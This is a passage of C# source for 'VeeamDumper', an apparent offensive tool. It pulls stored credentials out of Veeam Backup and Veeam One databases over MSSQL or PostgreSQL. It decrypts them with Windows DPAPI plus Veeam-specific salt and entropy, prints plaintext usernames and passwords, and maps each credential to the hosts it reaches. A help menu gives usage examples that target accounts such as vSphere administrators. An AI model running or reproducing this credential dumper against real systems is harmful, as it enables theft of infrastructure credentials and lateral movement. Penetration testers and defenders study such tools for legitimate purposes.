                                    password = DecryptOne(encrypted);
                                else if (encrypted.StartsWith("A"))
                                    password = DecryptA(encrypted);
                                else if (encrypted.StartsWith("V"))
                                    password = DecryptV(encrypted);
                                else
                                    continue;

                                
                                
                                Console.WriteLine($"Username   : {username}");
                                Console.WriteLine($"Password   : {password}");
                                Console.WriteLine($"Description: {description}");
                                Console.WriteLine("---------------------------------------------");
                            }
                            catch (Exception ex) 
                            {
                                Console.WriteLine(ex.ToString());
                                Console.WriteLine($"[ERROR] Failed to decrypt {username}");
                            }
                        }
                    }
                }
            }
        }

        static string DecryptA(string encrypted)
        {
            var data = Convert.FromBase64String(encrypted);
            var raw = System.Security.Cryptography.ProtectedData.Unprotect(
                data,
                null,
                System.Security.Cryptography.DataProtectionScope.LocalMachine
            );
            return Encoding.UTF8.GetString(raw);
        }

        static string DecryptV(string encrypted)
        {
            if (VeeamSalt == null)
                throw new Exception("EncryptionSalt not initialised. Call InitialiseVeeamSalt() first.");

            var data = Convert.FromBase64String(encrypted);
            var hex = BitConverter.ToString(data).Replace("-", "").ToLower();

            if (hex.Length <= 74)
                throw new Exception("Invalid V-format blob");

            hex = hex.Substring(74);

            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);

            var raw = System.Security.Cryptography.ProtectedData.Unprotect(
                bytes,
                VeeamSalt,
                System.Security.Cryptography.DataProtectionScope.LocalMachine
            );

            return Encoding.UTF8.GetString(raw);
        }

        static string DecryptOne(string encrypted)
        {
            if (string.IsNullOrEmpty(encrypted) || VeeamEntropy == null || VeeamEntropy.Length == 0)
                throw new Exception("Entropy not initialised. Call InitialiseVeeamEntropy() first.");

            var data = Convert.FromBase64String(encrypted);
            var raw = System.Security.Cryptography.ProtectedData.Unprotect(
                data,
                VeeamEntropy,
                System.Security.Cryptography.DataProtectionScope.LocalMachine
            );

            return Encoding.Unicode.GetString(raw);
        }
        static List<string[]> ExecuteMapQuery(ProcessStartInfo psi)
        {
            Console.WriteLine($"[INFO] Running command: {psi.FileName} {psi.Arguments}");

            using (var process = Process.Start(psi))
            {
                var errorBuilder = new StringBuilder();
                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
                process.BeginErrorReadLine();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                string error = errorBuilder.ToString();

                if (DEBUG)
                {
                    Console.WriteLine("[DEBUG] SQL Output:");
                    Console.WriteLine(output);
                    Console.WriteLine("[DEBUG] SQL Error:");
                    Console.WriteLine(error);
                }

                if (!string.IsNullOrWhiteSpace(error))
                {
                    Console.WriteLine($"[ERROR] SQL: {error}");
                    return new List<string[]>();
                }

                if (string.IsNullOrWhiteSpace(output) || output.Contains("(0 rows affected)"))
                {
                    Console.WriteLine("[INFO] No rows returned.");
                    return new List<string[]>();
                }

                var results = new List<string[]>();

                var lines = output
                    .Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);

                foreach (var line in lines)
                {
                    var columns = line.Split(':');

                    if (columns.Length >= 2)
                        results.Add(columns);
                }

                return results;
            }
        }

        static void PrintCredentialHostTable(List<string[]> mapping)
        {
            if (mapping == null || mapping.Count == 0)
            {
                Console.WriteLine("[INFO] No credential mappings found.");
                return;
            }

            // Determine column width dynamically
            int usernameWidth = Math.Max(
                "Username".Length,
                mapping.Max(x => x[0].Trim().Length)
            ) + 4;

            Console.WriteLine();
            Console.WriteLine(new string('=', usernameWidth + 30));
            Console.WriteLine("Username".PadRight(usernameWidth) + "Hosts");
            Console.WriteLine(new string('=', usernameWidth + 30));

            foreach (var row in mapping.OrderBy(x => x[0]))
            {
                string username = row[0].Trim();

                var hosts = row[1]
                    .Split(',')
                    .Select(h => h.Trim())
                    .Where(h => !string.IsNullOrWhiteSpace(h))
                    .Distinct(StringComparer.OrdinalIgnoreCase)
                    .OrderBy(h => h)
                    .ToList();

                // Print username only once
                Console.WriteLine(username.PadRight(usernameWidth) + $"> {hosts.FirstOrDefault()}");

                // Remaining hosts as bullet continuation
                foreach (var host in hosts.Skip(1))
                {
                    Console.WriteLine(new string(' ', usernameWidth) + $"> {host}");
                }
                Console.WriteLine(new string('-', usernameWidth + 30));
            }
        }

        static void PrintHelp()
        {
            Console.WriteLine("==================================================================");
            Console.WriteLine("|                                                                |");
            Console.WriteLine("|                        *(((((((((((((.                         |");
            Console.WriteLine("|                   (((((((((((((((((((((((((                    |");
            Console.WriteLine("|                (((((((((((((((((/(((((((((((((                 |");
            Console.WriteLine("|             ((((((((((((((((,(((((((((((((((((((               |");
            Console.WriteLine("|           *((((((((((((( *((((((((((((((((((((((               |");
            Console.WriteLine("|          ((((((((((((  ((((((((((((((((((((((((    ..          |");
            Console.WriteLine("|         (((((((((((  ((((               ((((       &&          |");
            Console.WriteLine("|        *((((((((*  ,                              &&&,         |");
            Console.WriteLine("|        ((((((((            /&&&&&&&&&,           &&&&&         |");
            Console.WriteLine("|        ((((((            &&&&&&&&&&&           .&&&&&&         |");
            Console.WriteLine("|        (((((           ,&&&&&&&&&.            &&&&&&&&         |");
            Console.WriteLine("|        *(((                             *   &&&&&&&&&,         |");
            Console.WriteLine("|         ((      .&&&&               %&&&  &&&&&&&&&&%          |");
            Console.WriteLine("|          .    &&&&&&&&&&&&&&&&&&&&&&&% ,&&&&&&&&&&&%           |");
            Console.WriteLine("|              &&&&&&&&&&&&&&&&&&&&&&..&&&&&&&&&&&&&.            |");
            Console.WriteLine("|              &&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&/              |");
            Console.WriteLine("|                &&&&&&&&&&&&%%&&&&&&&&&&&&&&&&&                 |");
            Console.WriteLine("|                   %&&&&&&&&&&&&&&&&&&&&&&&%                    |");
            Console.WriteLine("|                         &&&&&&&&&&&&&                          |");
            Console.WriteLine("|                                                                |");
            Console.WriteLine("==================================================================");
            Console.WriteLine("|                    V E E A M   D U M P E R                     |");
            Console.WriteLine("==================================================================");
            Console.WriteLine("Usage: VeeamDumper.exe <action> [options]");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Actions:");
            Console.WriteLine("  enum         Enumerate Veeam configuration");
            Console.WriteLine("  auto         Automatically enumerate the configuration and extract credentials");
            Console.WriteLine("  mssql        Extract Veeam credentials from MSSQL database");
            Console.WriteLine("  psql         Extract Veeam credentials from PostgreSQL database");
            Console.WriteLine("  map          Map credentials to specific targets [Experimental]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  -s <server>      Override SQL Server instance (value passed to sqlcmd -S)");
            Console.WriteLine("  -v <dbName>      Override Veeam database name (default: VeeamBackup)");
            Console.WriteLine("  -m <sqlcmdPath>  Override path to sqlcmd.exe");
            Console.WriteLine("  -p <psqlPath>    Override path to psql.exe");
            Console.WriteLine("  -l               Enumerate usernames of credentials stored in the database");
            Console.WriteLine("  -u <username>    Decrypt credentials for only a specific user in the database");
            Console.WriteLine("  -o               Target Veeam One instead of Veeam Backup and Replication");
            Console.WriteLine("  -d               Enable debug output for all steps");
            Console.WriteLine("  -h, --help       Show this help menu");
            Console.WriteLine();
            Console.WriteLine("Examples:");
            Console.WriteLine("  VeeamDumper.exe enum");
            Console.WriteLine("  VeeamDumper.exe auto");
            Console.WriteLine("  VeeamDumper.exe auto -s \".\\VEEAMSQL2016\"");
            Console.WriteLine("  VeeamDumper.exe mssql");
            Console.WriteLine("  VeeamDumper.exe mssql -s \".\\VEEAMSQL2016\"");
            Console.WriteLine("  VeeamDumper.exe mssql -s \"SERVERNAME\\VEEAMSQL2016\" -v VeeamBackup");
            Console.WriteLine("  VeeamDumper.exe mssql -l");
            Console.WriteLine("  VeeamDumper.exe mssql -o");
            Console.WriteLine("  VeeamDumper.exe mssql -o -s \".\\VEEAMSQL2016\"");
            Console.WriteLine("  VeeamDumper.exe mssql -u \"administrator@vsphere.local\"");
            Console.WriteLine("  VeeamDumper.exe mssql -v VeeamBackup2017 -m \"C:\\Tools\\sqlcmd.exe\" -d");
            Console.WriteLine("  VeeamDumper.exe psql");
            Console.WriteLine("  VeeamDumper.exe psql -l");
            Console.WriteLine("  VeeamDumper.exe psql -u \"administrator@vsphere.local\"");
            Console.WriteLine("  VeeamDumper.exe psql -v VeeamBackup2016 -p \"C:\\PostgreSQL\\15\\bin\\psql.exe\" -d");
            Console.WriteLine("  VeeamDumper.exe map");
            Console.WriteLine("  VeeamDumper.exe map -o");
            Console.WriteLine("  VeeamDumper.exe map -s \".\\VEEAMSQL2016\"");
        }
    }
}
